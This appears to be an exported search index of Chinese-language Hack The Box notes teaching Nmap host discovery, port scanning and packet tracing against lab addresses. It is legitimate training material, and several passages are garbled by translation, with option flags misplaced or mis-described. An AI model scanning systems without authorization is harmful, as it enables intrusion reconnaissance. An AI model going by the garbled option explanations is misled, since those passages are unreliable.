<p>\u4f8b\u5982\uff0c\u9664\u975e\u6211\u4eec\u53e6\u6709\u5b9a\u4e49\uff0c\u5426\u5219TCP-SYN \u626b\u63cf (<code>-sS</code> ) \u662f\u9ed8\u8ba4\u8bbe\u7f6e\u4e4b\u4e00\uff0c\u4e5f\u662f\u6700\u6d41\u884c\u7684\u626b\u63cf\u65b9\u6cd5\u4e4b\u4e00\u3002\u8fd9\u79cd\u626b\u63cf\u65b9\u6cd5\u53ef\u4ee5\u6bcf\u79d2\u626b\u63cf\u6570\u5343\u4e2a\u7aef\u53e3\u3002TCP-SYN \u626b\u63cf\u53d1\u9001\u4e00\u4e2a\u5e26\u6709 SYN \u6807\u5fd7\u7684\u6570\u636e\u5305\uff0c\u56e0\u6b64\u6c38\u8fdc\u4e0d\u4f1a\u5b8c\u6210\u4e09\u6b21\u63e1\u624b\uff0c\u4ece\u800c\u5bfc\u81f4\u65e0\u6cd5\u4e0e\u626b\u63cf\u7aef\u53e3\u5efa\u7acb\u5b8c\u6574\u7684 TCP \u8fde\u63a5\u3002</p> <ul> <li>\u5982\u679c\u6211\u4eec\u7684\u76ee\u6807\u5c06<code>SYN-ACK</code>\u6807\u8bb0\u7684\u6570\u636e\u5305\u53d1\u9001\u56de\u626b\u63cf\u7684\u7aef\u53e3\uff0cNmap \u4f1a\u68c0\u6d4b\u5230\u8be5\u7aef\u53e3\u662f<code>open</code>.</li> <li>\u5982\u679c\u6570\u636e\u5305\u6536\u5230<code>RST</code>\u6807\u5fd7\uff0c\u5219\u8868\u660e\u8be5\u7aef\u53e3\u662f<code>closed</code>\u3002</li> <li>\u5982\u679c Nmap \u6ca1\u6709\u6536\u5230\u8fd4\u56de\u7684\u6570\u636e\u5305\uff0c\u5b83\u5c06\u663e\u793a\u4e3a<code>filtered</code>. \u6839\u636e\u9632\u706b\u5899\u914d\u7f6e\uff0c\u67d0\u4e9b\u6570\u636e\u5305\u53ef\u80fd\u4f1a\u88ab\u9632\u706b\u5899\u4e22\u5f03\u6216\u5ffd\u7565\u3002</li> </ul> <p>\u8ba9\u6211\u4eec\u4e3e\u4e00\u4e2a\u8fd9\u6837\u7684\u626b\u63cf\u7684\u4f8b\u5b50\u3002</p> <pre><code>darkinga@htb[/htb]$ sudo nmap -sS localhost\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-11 22:50 UTC\nNmap scan report for localhost (127.0.0.1)\nHost is up (0.000010s latency).\nNot shown: 996 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n5432/tcp open  postgresql\n5901/tcp open  vnc-1\n\nNmap done: 1 IP address (1 host up) scanned in 0.18 seconds\n</code></pre> <p>\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u6253\u5f00\u4e86\u56db\u4e2a\u4e0d\u540c\u7684 TCP \u7aef\u53e3\u3002\u5728\u7b2c\u4e00\u5217\u4e2d\uff0c\u6211\u4eec\u770b\u5230\u7aef\u53e3\u53f7\u3002\u7136\u540e\uff0c\u5728\u7b2c\u4e8c\u5217\u4e2d\uff0c\u6211\u4eec\u770b\u5230\u670d\u52a1\u7684\u72b6\u6001\u4ee5\u53ca\u5b83\u662f\u4ec0\u4e48\u7c7b\u578b\u7684\u670d\u52a1\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_6","title":"\u4e3b\u673a\u679a\u4e3e","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_7","title":"\u4e3b\u673a\u53d1\u73b0","text":"<p>\u6700\u6709\u6548\u5feb\u901f\u7684\u65b9\u6cd5\u662f\u4f7f\u7528 <code>ICMP</code> \u56de\u663e\u8bf7\u6c42\u65b9\u6cd5</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_8","title":"\u626b\u63cf\u7f51\u7edc\u8303\u56f4","text":"<pre><code>$ sudo nmap 10.10.10.10/24 -sn -oA tnet | grep for | cut -d\" \" -f5\n</code></pre> <p><code>10.10.10.10/24</code>    \u76ee\u6807\u7f51\u7edc\u8303\u56f4</p> <p><code>-sn</code>   \u7981\u7528\u7aef\u53e3\u626b\u63cf</p> <p><code>-oA tnet</code>  \u4ee5\u540d\u79f0\u201ctnet\u201d\u5f00\u5934\u7684\u6240\u6709\u683c\u5f0f\u5b58\u50a8\u7ed3\u679c\u3002</p> <p>\u4e3b\u673a\u9632\u706b\u5899\u672a\u7981\u7528 <code>ICMP</code> \u65f6\u624d\u751f\u6548</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#ip","title":"\u626b\u63cf IP \u5217\u8868","text":"<p>\u5728\u5185\u90e8\u6e17\u900f\u6d4b\u8bd5\u671f\u95f4\uff0c\u5411\u6211\u4eec\u63d0\u4f9b\u5305\u542b\u6211\u4eec\u9700\u8981\u6d4b\u8bd5\u7684\u4e3b\u673a\u7684 IP \u5217\u8868\u7684\u60c5\u51b5\u5e76\u4e0d\u5c11\u89c1\u3002 Nmap \u8fd8\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u5b9e\u7528\u5217\u8868\u5e76\u4ece\u5217\u8868\u4e2d\u8bfb\u53d6\u4e3b\u673a\u7684\u9009\u9879\uff0c\u800c\u4e0d\u662f\u624b\u52a8\u5b9a\u4e49\u6216\u8f93\u5165\u5b83\u4eec\u3002</p> <pre><code>$ sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d\" \" -f5\n\n10.129.2.18\n10.129.2.19\n10.129.2.20\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>-sn</code> \u7981\u7528\u7aef\u53e3\u626b\u63cf\u3002 <code>-oA tnet</code> \u4ee5\u540d\u79f0\u201ctnet\u201d\u5f00\u5934\u7684\u6240\u6709\u683c\u5f0f\u5b58\u50a8\u7ed3\u679c\u3002 <code>-iL</code> \u9488\u5bf9\u63d0\u4f9b\u7684\u201chosts.lst\u201d\u5217\u8868\u4e2d\u7684\u76ee\u6807\u6267\u884c\u5b9a\u4e49\u7684\u626b\u63cf\u3002"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#ip_1","title":"\u626b\u63cf\u591a\u4e2aIP","text":"<p>\u4e5f\u53ef\u80fd\u6211\u4eec\u53ea\u9700\u8981\u626b\u63cf\u7f51\u7edc\u7684\u4e00\u5c0f\u90e8\u5206\u3002\u6211\u4eec\u4e0a\u6b21\u4f7f\u7528\u7684\u65b9\u6cd5\u7684\u66ff\u4ee3\u65b9\u6cd5\u662f\u6307\u5b9a\u591a\u4e2a IP \u5730\u5740\u3002</p> <p>\u626b\u63cf\u7f51\u7edc\u8303\u56f4</p> <pre><code>darkinga@htb[/htb]$ sudo nmap -sn -oA tnet 10.129.2.18 10.129.2.19 10.129.2.20| grep for | cut -d\" \" -f5\n\n10.129.2.18\n10.129.2.19\n10.129.2.20\n</code></pre> <p>\u5982\u679c\u8fd9\u4e9b IP \u5730\u5740\u5f7c\u6b64\u76f8\u90bb\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u5728\u5404\u81ea\u7684\u516b\u4f4d\u5b57\u8282\u4e2d\u5b9a\u4e49\u8303\u56f4\u3002</p> <p>\u626b\u63cf\u7f51\u7edc\u8303\u56f4</p> <pre><code>darkinga@htb[/htb]$ sudo nmap -sn -oA tnet 10.129.2.18-20| grep for | cut -d\" \" -f5\n\n10.129.2.18\n10.129.2.19\n10.129.2.20\n</code></pre>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#ip_2","title":"\u626b\u63cf\u5355\u4e2aIP","text":"<p>\u5728\u6211\u4eec\u626b\u63cf\u5355\u4e2a\u4e3b\u673a\u7684\u5f00\u653e\u7aef\u53e3\u53ca\u5176\u670d\u52a1\u4e4b\u524d\uff0c\u6211\u4eec\u9996\u5148\u5fc5\u987b\u786e\u5b9a\u5b83\u662f\u5426\u5b58\u6d3b\u3002\u4e3a\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4e0e\u4ee5\u524d\u76f8\u540c\u7684\u65b9\u6cd5\u3002</p> <p>\u626b\u63cf\u7f51\u7edc\u8303\u56f4</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.18 -sn -oA host \n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-14 23:59 CEST\nNmap scan report for 10.129.2.18\nHost is up (0.087s latency).\nMAC Address: DE:AD:00:00:BE:EF\nNmap done: 1 IP address (1 host up) scanned in 0.11 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.18</code> \u9488\u5bf9\u76ee\u6807\u6267\u884c\u5b9a\u4e49\u7684\u626b\u63cf\u3002 <code>-sn</code> \u7981\u7528\u7aef\u53e3\u626b\u63cf\u3002 <code>-oA host</code> \u4ee5\u540d\u79f0\u201c\u4e3b\u673a\u201d\u5f00\u5934\u7684\u6240\u6709\u683c\u5f0f\u5b58\u50a8\u7ed3\u679c\u3002 <p>\u5982\u679c\u6211\u4eec\u7981\u7528\u7aef\u53e3\u626b\u63cf ( )\uff0cNmap \u4f1a\u81ea\u52a8\u4f7f\u7528( ) <code>-sn</code>ping \u626b\u63cf\u3002\u4e00\u65e6\u53d1\u9001\u4e86\u8fd9\u6837\u7684\u8bf7\u6c42\uff0c\u6211\u4eec\u901a\u5e38\u4f1a\u671f\u5f85ping \u4e3b\u673a\u662f\u5426\u5904\u4e8e\u6d3b\u52a8\u72b6\u6001\u3002\u66f4\u6709\u8da3\u7684\u662f\uff0c\u6211\u4eec\u4e4b\u524d\u7684\u626b\u63cf\u5e76\u6ca1\u6709\u8fd9\u6837\u505a\uff0c\u56e0\u4e3a\u5728 Nmap \u53ef\u4ee5\u53d1\u9001 ICMP \u56de\u663e\u8bf7\u6c42\u4e4b\u524d\uff0c\u5b83\u4f1a\u53d1\u9001\u4e00\u4e2a. \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u201c \u201d\u9009\u9879\u786e\u8ba4\u8fd9\u4e00\u70b9\u3002\u4e3a\u786e\u4fdd\u53d1\u9001 ICMP \u56de\u663e\u8bf7\u6c42\uff0c\u6211\u4eec\u8fd8\u4e3a\u6b64\u5b9a\u4e49\u4e86\u9009\u9879 ( )\u3002<code>ICMP Echo Requests``-PE``ICMP reply``ARP ping``ARP reply``--packet-trace``-PE</code></p> <p>\u626b\u63cf\u7f51\u7edc\u8303\u56f4</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace \n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 00:08 CEST\nSENT (0.0074s) ARP who-has 10.129.2.18 tell 10.10.14.2\nRCVD (0.0309s) ARP reply 10.129.2.18 is-at DE:AD:00:00:BE:EF\nNmap scan report for 10.129.2.18\nHost is up (0.023s latency).\nMAC Address: DE:AD:00:00:BE:EF\nNmap done: 1 IP address (1 host up) scanned in 0.05 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.18</code> \u9488\u5bf9\u76ee\u6807\u6267\u884c\u5b9a\u4e49\u7684\u626b\u63cf\u3002 <code>-sn</code> \u7981\u7528\u7aef\u53e3\u626b\u63cf\u3002 <code>-oA host</code> \u4ee5\u540d\u79f0\u201c\u4e3b\u673a\u201d\u5f00\u5934\u7684\u6240\u6709\u683c\u5f0f\u5b58\u50a8\u7ed3\u679c\u3002 <code>-PE</code> \u901a\u8fc7\u4f7f\u7528\u201cICMP Echo \u8bf7\u6c42\u201d\u5bf9\u76ee\u6807\u6267\u884c ping \u626b\u63cf\u3002 <code>--packet-trace</code> \u663e\u793a\u6240\u6709\u53d1\u9001\u548c\u63a5\u6536\u7684\u6570\u636e\u5305 <p>\u53e6\u4e00\u79cd\u786e\u5b9a\u4e3a\u4ec0\u4e48 Nmap \u5c06\u6211\u4eec\u7684\u76ee\u6807\u6807\u8bb0\u4e3a\u201c\u6d3b\u52a8\u201d\u7684\u65b9\u6cd5\u662f\u4f7f\u7528\u201c <code>--reason</code>\u201d\u9009\u9879\u3002</p> <p>\u626b\u63cf\u7f51\u7edc\u8303\u56f4</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.18 -sn -oA host -PE --reason \n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 00:10 CEST\nSENT (0.0074s) ARP who-has 10.129.2.18 tell 10.10.14.2\nRCVD (0.0309s) ARP reply 10.129.2.18 is-at DE:AD:00:00:BE:EF\nNmap scan report for 10.129.2.18\nHost is up, received arp-response (0.028s latency).\nMAC Address: DE:AD:00:00:BE:EF\nNmap done: 1 IP address (1 host up) scanned in 0.03 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.18</code> \u9488\u5bf9\u76ee\u6807\u6267\u884c\u5b9a\u4e49\u7684\u626b\u63cf\u3002 <code>-sn</code> \u7981\u7528\u7aef\u53e3\u626b\u63cf\u3002 <code>-oA host</code> \u4ee5\u540d\u79f0\u201c\u4e3b\u673a\u201d\u5f00\u5934\u7684\u6240\u6709\u683c\u5f0f\u5b58\u50a8\u7ed3\u679c\u3002 <code>-PE</code> \u901a\u8fc7\u4f7f\u7528\u201cICMP Echo \u8bf7\u6c42\u201d\u5bf9\u76ee\u6807\u6267\u884c ping \u626b\u63cf\u3002 <code>--reason</code> \u663e\u793a\u7279\u5b9a\u7ed3\u679c\u7684\u539f\u56e0\u3002 <p>\u6211\u4eec\u5728\u8fd9\u91cc\u770b\u5230\u786e\u5b9e\u786e\u5b9e\u901a\u8fc7and\u5355\u72ec<code>Nmap</code>\u68c0\u6d4b\u4e86\u5bbf\u4e3b\u662f\u5426\u5b58\u6d3b\u3002\u8981\u7981\u7528 ARP \u8bf7\u6c42\u5e76\u4f7f\u7528\u6240\u9700\u7684\u626b\u63cf\u6211\u4eec\u7684\u76ee\u6807\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6e\u201c \u201d\u9009\u9879\u6765\u7981\u7528 ARP ping\u3002\u7136\u540e\u6211\u4eec\u53ef\u4ee5\u518d\u6b21\u626b\u63cf\u6211\u4eec\u7684\u76ee\u6807\u5e76\u67e5\u770b\u53d1\u9001\u548c\u63a5\u6536\u7684\u6570\u636e\u5305\u3002<code>ARP request``ARP reply``ICMP echo requests``--disable-arp-ping</code></p> <p>\u626b\u63cf\u7f51\u7edc\u8303\u56f4</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace --disable-arp-ping \n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 00:12 CEST\nSENT (0.0107s) ICMP [10.10.14.2 &gt; 10.129.2.18 Echo request (type=8/code=0) id=13607 seq=0] IP [ttl=255 id=23541 iplen=28 ]\nRCVD (0.0152s) ICMP [10.129.2.18 &gt; 10.10.14.2 Echo reply (type=0/code=0) id=13607 seq=0] IP [ttl=128 id=40622 iplen=28 ]\nNmap scan report for 10.129.2.18\nHost is up (0.086s latency).\nMAC Address: DE:AD:00:00:BE:EF\nNmap done: 1 IP address (1 host up) scanned in 0.11 seconds\n</code></pre> <p>\u6211\u4eec\u5df2\u7ecf\u5728\u201c <code>Learning Process</code>\uff0c\u201d\u4e2d\u63d0\u5230\uff0c\u5728\u672c\u6a21\u5757\u7684\u5f00\u5934\uff0c\u6ce8\u610f\u7ec6\u8282\u662f\u5fc5\u4e0d\u53ef\u5c11\u7684\u3002\u4e00\u4e2a<code>ICMP echo request</code>\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u786e\u5b9a\u6211\u4eec\u7684\u76ee\u6807\u662f\u5426\u6d3b\u7740\u5e76\u8bc6\u522b\u5b83\u7684\u7cfb\u7edf\u3002\u6709\u5173\u4e3b\u673a\u53d1\u73b0\u7684\u66f4\u591a\u7b56\u7565\uff0c\u8bf7\u8bbf\u95ee\uff1a</p> <p>https://nmap.org/book/host-discovery-strategies.html</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_9","title":"\u4e3b\u673a\u548c\u7aef\u53e3\u626b\u63cf","text":"<p>\u5fc5\u987b\u4e86\u89e3\u6211\u4eec\u4f7f\u7528\u7684\u5de5\u5177\u5982\u4f55\u5de5\u4f5c\u4ee5\u53ca\u5b83\u5982\u4f55\u6267\u884c\u548c\u5904\u7406\u4e0d\u540c\u7684\u529f\u80fd\u3002\u53ea\u6709\u77e5\u9053\u7ed3\u679c\u7684\u542b\u4e49\u548c\u83b7\u5f97\u65b9\u5f0f\uff0c\u6211\u4eec\u624d\u80fd\u7406\u89e3\u7ed3\u679c\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u5c06\u4ed4\u7ec6\u7814\u7a76\u548c\u5206\u6790\u4e00\u4e9b\u626b\u63cf\u65b9\u6cd5\u3002\u5728\u6211\u4eec\u53d1\u73b0\u6211\u4eec\u7684\u76ee\u6807\u662f\u6d3b\u7684\u4e4b\u540e\uff0c\u6211\u4eec\u60f3\u5f97\u5230\u4e00\u4e2a\u66f4\u51c6\u786e\u7684\u7cfb\u7edf\u56fe\u3002\u6211\u4eec\u9700\u8981\u7684\u4fe1\u606f\u5305\u62ec\uff1a</p> <ul> <li>\u5f00\u653e\u7aef\u53e3\u53ca\u5176\u670d\u52a1</li> <li>\u670d\u52a1\u7248\u672c</li> <li>\u670d\u52a1\u63d0\u4f9b\u7684\u4fe1\u606f</li> <li>\u64cd\u4f5c\u7cfb\u7edf</li> </ul> <p>\u5bf9\u4e8e\u4e00\u4e2a\u88ab\u626b\u63cf\u7684\u7aef\u53e3\uff0c\u6211\u4eec\u603b\u5171\u53ef\u4ee5\u83b7\u5f976\u79cd\u4e0d\u540c\u7684\u72b6\u6001\uff1a</p> \u72b6\u6001 \u63cf\u8ff0 <code>open</code> \u8fd9\u8868\u660e\u5df2\u5efa\u7acb\u4e0e\u626b\u63cf\u7aef\u53e3\u7684\u8fde\u63a5\u3002\u8fd9\u4e9b\u8fde\u63a5\u53ef\u4ee5\u662fTCP \u8fde\u63a5\u3001UDP \u6570\u636e\u62a5\u4ee5\u53caSCTP \u5173\u8054\u3002 <code>closed</code> \u5f53\u7aef\u53e3\u663e\u793a\u4e3a\u5173\u95ed\u65f6\uff0cTCP \u534f\u8bae\u8868\u660e\u6211\u4eec\u6536\u5230\u7684\u6570\u636e\u5305\u5305\u542b\u4e00\u4e2a<code>RST</code>\u6807\u5fd7\u3002\u8fd9\u79cd\u626b\u63cf\u65b9\u6cd5\u4e5f\u53ef\u4ee5\u7528\u6765\u5224\u65ad\u6211\u4eec\u7684\u76ee\u6807\u662f\u5426\u8fd8\u6d3b\u7740\u3002 <code>filtered</code> Nmap \u65e0\u6cd5\u6b63\u786e\u8bc6\u522b\u626b\u63cf\u7684\u7aef\u53e3\u662f\u6253\u5f00\u8fd8\u662f\u5173\u95ed\uff0c\u56e0\u4e3a\u76ee\u6807\u6ca1\u6709\u4e3a\u8be5\u7aef\u53e3\u8fd4\u56de\u4efb\u4f55\u54cd\u5e94\uff0c\u6216\u8005\u6211\u4eec\u4ece\u76ee\u6807\u83b7\u5f97\u9519\u8bef\u4ee3\u7801\u3002 <code>unfiltered</code> \u7aef\u53e3\u7684\u8fd9\u79cd\u72b6\u6001\u53ea\u5728TCP-ACK\u626b\u63cf\u65f6\u51fa\u73b0\uff0c\u8868\u793a\u7aef\u53e3\u53ef\u4ee5\u8bbf\u95ee\uff0c\u4f46\u65e0\u6cd5\u5224\u65ad\u662fopen\u8fd8\u662fclosed\u3002 <code>open|filtered</code> \u5982\u679c\u6211\u4eec\u6ca1\u6709\u5f97\u5230\u7279\u5b9a\u7aef\u53e3\u7684\u54cd\u5e94\uff0c<code>Nmap</code>\u5c06\u628a\u5b83\u8bbe\u7f6e\u4e3a\u8be5\u72b6\u6001\u3002\u8fd9\u8868\u660e\u9632\u706b\u5899\u6216\u6570\u636e\u5305\u8fc7\u6ee4\u5668\u53ef\u80fd\u4f1a\u4fdd\u62a4\u8be5\u7aef\u53e3\u3002 <code>closed|filtered</code> \u8fd9\u79cd\u72b6\u6001\u53ea\u51fa\u73b0\u5728IP ID\u7a7a\u95f2\u626b\u63cf\u4e2d\uff0c\u8868\u793a\u65e0\u6cd5\u786e\u5b9a\u626b\u63cf\u7684\u7aef\u53e3\u662f\u5426\u88ab\u9632\u706b\u5899\u5173\u95ed\u6216\u8fc7\u6ee4\u3002"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#tcp","title":"\u53d1\u73b0\u5f00\u653e\u7684 TCP \u7aef\u53e3","text":"<p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c<code>Nmap</code>\u4f7f\u7528 SYN \u626b\u63cf ( <code>-sS</code>) \u626b\u63cf\u524d 1000 \u4e2a TCP \u7aef\u53e3\u3002\u7531\u4e8e\u521b\u5efa\u539f\u59cb TCP \u6570\u636e\u5305\u9700\u8981\u5957\u63a5\u5b57\u6743\u9650\uff0c\u56e0\u6b64\u5f53\u6211\u4eec\u4ee5 root \u8eab\u4efd\u8fd0\u884c\u65f6\uff0c\u6b64 SYN \u626b\u63cf\u4ec5\u8bbe\u7f6e\u4e3a\u9ed8\u8ba4\u503c\u3002<code>-sT</code>\u5426\u5219\uff0c\u9ed8\u8ba4\u6267\u884cTCP \u626b\u63cf ( )\u3002\u8fd9\u610f\u5473\u7740\u5982\u679c\u6211\u4eec\u4e0d\u5b9a\u4e49\u7aef\u53e3\u548c\u626b\u63cf\u65b9\u6cd5\uff0c\u8fd9\u4e9b\u53c2\u6570\u4f1a\u81ea\u52a8\u8bbe\u7f6e\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u626b\u63cf\u6240\u6709\u7aef\u53e3 ( <code>-p 22,25,80,139,445</code>) \u4ee5\u53ca\u5b9a\u4e49\u5feb\u901f\u7aef\u53e3\u626b\u63cf\uff0c\u901a\u8fc7\u626b\u63cf\u6240\u6709\u7aef\u53e3 ( <code>-p 22-445</code>)<code>--top-ports=10</code>\u4ee5\u53ca\u5b9a\u4e49\u5feb\u901f\u7aef\u53e3\u626b\u63cf\uff0c\u5176\u4e2d\u5305\u542b\u9876\u7ea7100 \u4e2a\u7aef\u53e3 ( )\u3002<code>Nmap``-p-``-F</code></p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#10-tcp","title":"\u626b\u63cf\u524d 10 \u4e2a TCP \u7aef\u53e3","text":"<p>\u626b\u63cf\u524d 10 \u4e2a TCP \u7aef\u53e3</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 --top-ports=10 \n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 15:36 CEST\nNmap scan report for 10.129.2.28\nHost is up (0.021s latency).\n\nPORT     STATE    SERVICE\n21/tcp   closed   ftp\n22/tcp   open     ssh\n23/tcp   closed   telnet\n25/tcp   open     smtp\n80/tcp   open     http\n110/tcp  open     pop3\n139/tcp  filtered netbios-ssn\n443/tcp  closed   https\n445/tcp  filtered microsoft-ds\n3389/tcp closed   ms-wbt-server\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 1.44 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>--top-ports=10</code> \u626b\u63cf\u5df2\u5b9a\u4e49\u4e3a\u6700\u9891\u7e41\u7684\u6307\u5b9a\u9876\u7ea7\u7aef\u53e3\u3002 <p>\u6211\u4eec\u770b\u5230\u6211\u4eec\u53ea\u626b\u63cf\u4e86\u76ee\u6807\u7684\u524d 10 \u4e2a TCP \u7aef\u53e3\uff0c\u5e76<code>Nmap</code>\u76f8\u5e94\u5730\u663e\u793a\u5b83\u4eec\u7684\u72b6\u6001\u3002\u5982\u679c\u6211\u4eec\u8ddf\u8e2a<code>Nmap</code>\u53d1\u9001\u7684\u6570\u636e\u5305\uff0c\u6211\u4eec\u5c06\u770b\u5230\u76ee\u6807\u53d1\u9001\u56de\u7ed9\u6211\u4eec\u7684<code>RST</code>\u6807\u5fd7\u3002<code>TCP port 21</code>\u4e3a\u4e86\u6e05\u695a\u5730\u4e86\u89e3 SYN \u626b\u63cf\uff0c\u6211\u4eec\u7981\u7528 ICMP \u56de\u663e\u8bf7\u6c42 ( <code>-Pn</code>)\u3001DNS \u89e3\u6790 ( <code>-n</code>) \u548c ARP ping \u626b\u63cf ( <code>--disable-arp-ping</code>)\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#nmap-","title":"Nmap - \u8ddf\u8e2a\u6570\u636e\u5305","text":"<p>Nmap - \u8ddf\u8e2a\u6570\u636e\u5305</p> <pre><code>darkinga@htb[/htb]$ sudo nmap 10.129.2.28 -p 21 --packet-trace -Pn -n --disable-arp-ping\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 15:39 CEST\nSENT (0.0429s) TCP 10.10.14.2:63090 &gt; 10.129.2.28:21 S ttl=56 id=57322 iplen=44  seq=1699105818 win=1024 &lt;mss 1460&gt;\nRCVD (0.0573s) TCP 10.129.2.28:21 &gt; 10.10.14.2:63090 RA ttl=64 id=0 iplen=40  seq=0 win=0\nNmap scan report for 10.11.1.28\nHost is up (0.014s latency).\n\nPORT   STATE  SERVICE\n21/tcp closed ftp\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 0.07 seconds\n</code></pre> \u626b\u63cf\u9009\u9879 \u63cf\u8ff0 <code>10.129.2.28</code> \u626b\u63cf\u6307\u5b9a\u76ee\u6807\u3002 <code>-p 21</code> \u53ea\u626b\u63cf\u6307\u5b9a\u7684\u7aef\u53e3\u3002 <code>--packet-trace</code> \u663e\u793a\u6240\u6709\u53d1\u9001\u548c\u63a5\u6536\u7684\u6570\u636e\u5305\u3002 <code>-n</code> \u7981\u7528 DNS \u89e3\u6790\u3002 <code>--disable-arp-ping</code> \u7981\u7528 ARP ping\u3002 <p>\u4ece SENT \u884c\u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec ( )\u5411\u6211\u4eec\u7684\u76ee\u6807 ( )<code>10.10.14.2</code>\u53d1\u9001\u4e86\u4e00\u4e2a\u5e26\u6709<code>SYN</code>\u6807\u5fd7 ( ) \u7684 TCP \u6570\u636e\u5305\u3002\u5728\u4e0b\u4e00\u4e2a RCVD \u884c\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u76ee\u6807\u4f7f\u7528\u5305\u542b\u548c\u6807\u5fd7 ( ) \u7684 TCP \u6570\u636e\u5305\u8fdb\u884c\u54cd\u5e94\u3002\u548c\u6807\u5fd7\u7528\u4e8e\u786e\u8ba4\u6536\u5230 TCP \u6570\u636e\u5305 ( ) \u548c\u7ed3\u675f TCP \u4f1a\u8bdd ( )\u3002<code>S``10.129.2.28``RST``ACK``RA``RST``ACK``ACK``RST</code></p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Nmap%20%E7%BD%91%E7%BB%9C%E6%9E%9A%E4%B8%BE%20-%20HTB%20%E7%AC%94%E8%AE%B0/#_10","title":"\u8bf7\u6c42","text":"\u4fe1\u606f \u63cf\u8ff0 <code>SENT (0.0429s)</code> \u8868\u793aNmap\u7684SENT\u64cd\u4f5c\uff0c\u5411\u76ee\u6807\u53d1\u9001\u6570\u636e\u5305\u3002 <code>TCP</code> \u663e\u793a\u7528\u4e8e\u4e0e\u76ee\u6807\u7aef\u53e3\u4ea4\u4e92\u7684\u534f\u8bae\u3002 <code>10.10.14.2:63090 &gt;</code> \u8868\u793a\u6211\u4eec\u7684 IPv4 \u5730\u5740\u548c\u6e90\u7aef\u53e3\uff0cNmap \u5c06\u4f7f\u7528\u5b83\u4eec\u6765\u53d1\u9001\u6570\u636e\u5305\u3002 <code>10.129.2.28:21</code> \u663e\u793a\u76ee\u6807 IPv4 \u5730\u5740\u548c\u76ee\u6807\u7aef\u53e3\u3002 <code>S</code> \u53d1\u9001\u7684 TCP \u6570\u636e\u5305\u7684 SYN \u6807\u5fd7\u3002 <code>ttl=56 id=57322 iplen=44 